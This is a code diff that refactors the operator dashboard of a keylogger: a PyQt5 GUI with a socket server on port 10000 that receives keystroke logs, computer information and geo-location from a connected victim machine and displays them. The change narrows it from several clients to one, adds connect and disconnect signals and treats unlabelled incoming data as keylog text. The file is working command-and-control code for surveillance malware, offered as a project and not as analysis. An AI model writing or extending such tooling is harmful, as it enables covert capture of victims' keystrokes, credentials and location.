@@ -1,148 +1,101 @@
 import sys
 import socket
-import threading
-from clients.client2 import Ui_Widget2
-from clients.client3 import Ui_Widget3
-from clients.client4 import Ui_Widget4
-from clients.client5 import Ui_Widget5
-
-from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit, QVBoxLayout, QWidget, QLabel
+from PyQt5.QtWidgets import QApplication, QMainWindow
 from gui.controllers.Dashboard import Ui_MainWindow
 from gui.controllers.SetComputerInfo import Ui_SetComputerInfo
 from gui.controllers.SetEmailInfo import Ui_SetEmaiInfo
-from PyQt5.QtCore import pyqtSignal, QObject
+from PyQt5.QtCore import pyqtSignal, QThread
 
 
+class Worker(QThread):
+    keylog_signal = pyqtSignal(str)
+    computer_info_signal = pyqtSignal(str)
+    geo_location_signal = pyqtSignal(str)
+    client_connected_signal = pyqtSignal(str)
+    client_disconnected_signal = pyqtSignal()
 
-class ClientWindow(QMainWindow):
-    def __init__(self, client_id, client_number):
+    def __init__(self):
         super().__init__()
-        self.client_id = client_id
-        self.client_number = client_number
-        self.setWindowTitle(f"Client {client_number} - {client_id}")
+        self.client_socket = None
+        self.client_id = None
 
-        if client_number == 2:
-            self.ui = Ui_Widget2()
-        elif client_number == 3:
-            self.ui = Ui_Widget3()
-        elif client_number == 4:
-            self.ui = Ui_Widget4()
-        elif client_number == 5:
-            self.ui = Ui_Widget5()
-        else:
-            layout = QVBoxLayout()
-            self.client_label = QLabel(f"Client {client_number} Data")
-            layout.addWidget(self.client_label)
-            self.text_edit = QTextEdit()
-            self.text_edit.setReadOnly(True)
-            layout.addWidget(self.text_edit)
-            container = QWidget()
-            container.setLayout(layout)
-            self.setCentralWidget(container)
-            return
-
-        self.ui.setupUi(self)
-
-class Worker(QObject):
-    keylog_signal: pyqtSignal = pyqtSignal(str, str)
-    computer_info_signal: pyqtSignal = pyqtSignal(str, str)
-    geo_location_signal: pyqtSignal = pyqtSignal(str, str)
-
-
-    def __init__(self, ui, client_windows):
-        super().__init__()
-        self.ui = ui
-        self.client_windows = client_windows
-        self.clients = {}
-
-    def start_server(self):
+    def run(self):
         bindsocket = socket.socket()
         bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         bindsocket.bind(('0.0.0.0', 10000))
-        bindsocket.listen(5)
+        bindsocket.listen(1)  # Only accept 1 client
         print("[*] Server listening on port 10000")
 
         while True:
             try:
+                print("[*] Waiting for client connection...")
                 newsocket, fromaddr = bindsocket.accept()
-                client_id = str(fromaddr)
+                self.client_id = str(fromaddr)
+                self.client_socket = newsocket
+                print(f"[+] Client {self.client_id} connected")
 
-                if len(self.client_windows) >= 4:
-                    print(f"[-] Connection rejected: too many clients.")
-                    newsocket.close()
-                    continue
+                # Emit signal that client connected
+                self.client_connected_signal.emit(self.client_id)
 
-                self.clients[client_id] = newsocket
-                print(f"[+] Client {client_id} connected")
-
-                client_number = len(self.client_windows) + 2
-                client_window = ClientWindow(client_id, client_number)
-                client_window.show()
-                self.client_windows[client_id] = client_window
-
-                if client_id not in [self.ui.ComputerSelection.itemText(i) for i in range(self.ui.ComputerSelection.count())]:
-                    self.ui.ComputerSelection.addItem(client_id)
-
-                client_thread = threading.Thread(target=self.handle_client, args=(client_id, newsocket), daemon=True)
-                client_thread.start()
+                # Handle the client
+                self.handle_client()
 
             except Exception as e:
                 print(f"[!] Error accepting client connection: {e}")
 
-    def handle_client(self, client_id, newsocket):
+    def handle_client(self):
         try:
             while True:
                 try:
-                    data = newsocket.recv(4096).decode()
+                    data = self.client_socket.recv(4096).decode()
                 except Exception as e:
-                    print(f"[!] Error decoding data from {client_id}: {e}")
+                    print(f"[!] Error decoding data: {e}")
                     break
 
                 if data:
-                    print(f"[+] Data from {client_id}: {data.strip()}")
-                    self.handle_received_data(data.strip(), client_id)
+                    print(f"[+] Data received: {data.strip()}")
+                    self.handle_received_data(data.strip())
                 else:
                     break
         except Exception as e:
-            print(f"[!] Error handling data from client {client_id}: {e}")
+            print(f"[!] Error handling data: {e}")
         finally:
-            del self.clients[client_id]
-            print(f"[-] Client {client_id} disconnected")
-            self.client_windows[client_id].close()
-            index = self.ui.ComputerSelection.findText(client_id)
-            if index >= 0:
-                self.ui.ComputerSelection.removeItem(index)
+            if self.client_socket:
+                self.client_socket.close()
+            print(f"[-] Client disconnected")
+            self.client_disconnected_signal.emit()
 
-    def handle_received_data(self, data, client_id):
-        if "KEYLOG" in data:
-            print(f"[Worker] Emitting keylog for {client_id}")
-            self.keylog_signal.emit(client_id, data)
-        elif "COMPUTER_INFO" in data:
-            print(f"[Worker] Emitting computer info for {client_id}")
-            self.computer_info_signal.emit(client_id, data)
+    def handle_received_data(self, data):
+        if "COMPUTER_INFO" in data:
+            print(f"[Worker] Emitting computer info")
+            self.computer_info_signal.emit(data)
         elif "GEO_LOCATION" in data:
-            print(f"[Worker] Emitting geo-location for {client_id}")
-            self.geo_location_signal.emit(client_id, data)
+            print(f"[Worker] Emitting geo-location")
+            self.geo_location_signal.emit(data)
+        elif "HEARTBEAT" in data:
+            # Ignore heartbeat messages
+            print(f"[Worker] Heartbeat received")
         else:
-            print(f"[!] Unknown data type from {client_id}: {data}")
+            # Treat everything else as keylog data
+            print(f"[Worker] Emitting keylog")
+            self.keylog_signal.emit(data)
+
 
 class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
         self.ui = Ui_MainWindow()
         self.ui.setupUi(self)
-        self.client_windows = {}
+        self.client_connected = False
 
+        # Connect UI buttons
         self.ui.SetComputerInfo.clicked.connect(self.open_set_computer_info_window)
         self.ui.actionSet_Email_Info.triggered.connect(self.open_set_email_info_window)
         self.ui.RefreshButton.clicked.connect(self.refresh_logs)
         self.ui.actionLight_Mode.triggered.connect(self.set_light_mode)
         self.ui.actionDark_Mode.triggered.connect(self.set_dark_mode)
-        self.ui.ComputerSelection.currentIndexChanged.connect(self.handle_client_selection)
 
-        self.ui.ComputerSelection.clear()
-        self.ui.ComputerSelection.addItems(["Computer 2", "Computer 3", "Computer 4", "Computer 5"])
-
+        # Start server
         self.start_server_listener()
 
     def open_set_computer_info_window(self):
@@ -159,6 +112,10 @@ class MainWindow(QMainWindow):
 
     def refresh_logs(self):
         print("Refreshing logs...")
+        # Clear all text fields
+        self.ui.plainTextEdit.clear()
+        self.ui.plainTextEdit_2.clear()
+        self.ui.plainTextEdit_3.clear()
 
     def set_light_mode(self):
         self.setStyleSheet("background-color: white; color: black;")
@@ -169,57 +126,39 @@ class MainWindow(QMainWindow):
         print("Switched to dark mode.")
 
     def start_server_listener(self):
-        self.worker = Worker(self.ui, self.client_windows)
-        self.worker.keylog_signal.connect(self.update_keylog_for_client)
-        self.worker.computer_info_signal.connect(self.update_computer_info_for_client)
-        self.worker.geo_location_signal.connect(self.update_geo_location_for_client)
+        self.worker = Worker()
+        self.worker.keylog_signal.connect(self.update_keylog)
+        self.worker.computer_info_signal.connect(self.update_computer_info)
+        self.worker.geo_location_signal.connect(self.update_geo_location)
+        self.worker.client_connected_signal.connect(self.handle_client_connected)
+        self.worker.client_disconnected_signal.connect(self.handle_client_disconnected)
 
-        thread = threading.Thread(target=self.worker.start_server, daemon=True)
-        thread.start()
+        self.worker.start()
 
-    def handle_client_selection(self, index):
-        if index < 0:
-            return
-        client_id = self.ui.ComputerSelection.itemText(index)
-        if client_id in self.client_windows:
-            window = self.client_windows[client_id]
-            if not window.isVisible():
-                window.show()
-            window.raise_()
-            window.activateWindow()
+    def handle_client_connected(self, client_id):
+        """Handle new client connection"""
+        print(f"[MainWindow] Client connected: {client_id}")
+        self.client_connected = True
+        self.setWindowTitle(f"Dashboard - Client: {client_id}")
 
-    def update_keylog_for_client(self, client_id, log_line):
-        print(f"[MainWindow] Updating keylog for {client_id}")
-        if client_id in self.client_windows:
-            window = self.client_windows[client_id]
-            ui = window.ui
-            client_number = window.client_number
-            try:
-                getattr(ui, f"Client{client_number}_Keyloggs").appendPlainText(log_line)
-            except AttributeError:
-                print(f"[!] Client{client_number}_Keyloggs not found in UI")
+    def handle_client_disconnected(self):
+        """Handle client disconnection"""
+        print(f"[MainWindow] Client disconnected")
+        self.client_connected = False
+        self.setWindowTitle("Dashboard - No Client Connected")
 
-    def update_computer_info_for_client(self, client_id, info):
-        print(f"[MainWindow] Updating computer info for {client_id}")
-        if client_id in self.client_windows:
-            window = self.client_windows[client_id]
-            ui = window.ui
-            client_number = window.client_number
-            try:
-                getattr(ui, f"Client{client_number}_ComputerInformation").setPlainText(info)
-            except AttributeError:
-                print(f"[!] Client{client_number}_ComputerInformation not found in UI")
+    def update_keylog(self, log_line):
+        print(f"[MainWindow] Updating keylog: {log_line}")
+        self.ui.plainTextEdit_3.appendPlainText(log_line)
 
-    def update_geo_location_for_client(self, client_id, location):
-        print(f"[MainWindow] Updating geo location for {client_id}")
-        if client_id in self.client_windows:
-            window = self.client_windows[client_id]
-            ui = window.ui
-            client_number = window.client_number
-            try:
-                getattr(ui, f"Client{client_number}_GeoLocation").setPlainText(location)
-            except AttributeError:
-                print(f"[!] Client{client_number}_GeoLocation not found in UI")
+    def update_computer_info(self, info):
+        print(f"[MainWindow] Updating computer info")
+        self.ui.plainTextEdit.setPlainText(info)
+
+    def update_geo_location(self, location):
+        print(f"[MainWindow] Updating geo location")
+        self.ui.plainTextEdit_2.setPlainText(location)
+
 
 if __name__ == "__main__":
     app = QApplication(sys.argv)
